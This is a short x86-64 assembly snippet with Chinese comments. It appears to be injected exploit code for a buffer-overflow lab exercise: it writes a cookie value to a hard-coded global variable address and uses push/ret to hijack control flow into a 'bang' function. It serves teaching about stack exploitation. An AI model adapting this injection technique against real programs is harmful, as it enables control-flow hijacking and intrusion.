.section .text
.globl main
main:
    # 将cookie值存入global_value
    pushq $0xc109a39           # cookie值压栈
    popq %rax                  # 弹出到rax
    pushq $0x403350           # global_value地址压栈  
    popq %rbx                  # 弹出到rbx
    movl %eax, (%rbx)          # 将cookie存入global_value
    
    # 跳转到bang函数
    pushq $0x401346            # bang地址压栈
    ret                        # 跳转到bang